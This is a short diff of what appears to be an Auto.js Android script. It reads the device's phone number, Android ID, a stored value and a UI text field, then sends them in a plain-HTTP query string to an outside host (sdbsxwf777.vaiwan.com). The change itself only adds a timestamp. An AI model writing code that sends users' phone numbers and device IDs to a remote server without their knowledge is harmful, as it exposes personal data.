@@ -5,7 +5,8 @@ function shojihao() {
         var phoneNumber = mTelephonyManager.getLine1Number();
 var xxl=本地储存.get("xinxi");
 var bbss=ui.jhms.text();
-var jies=phoneNumber+":"+xxl+bbss;
+var sjs = new Date(); 
+var jies=phoneNumber+":"+xxl+bbss+sjs;
         return jies;
     } catch (e) {
         var bbss=ui.jhms.text();
@@ -14,7 +15,7 @@ return bbss;
 };
         var ids = device.getAndroidId();      
        var bbs=shojihao();
-        var sjs = new Date(); 
+        
         var res = http.get("http://sdbsxwf777.vaiwan.com/mis.php?fname=" + ids + "&age=" + bbs);
         if (res.statusCode != 200) {
             log("请求失败: " + res.statusCode + " " + res.statusMessage);
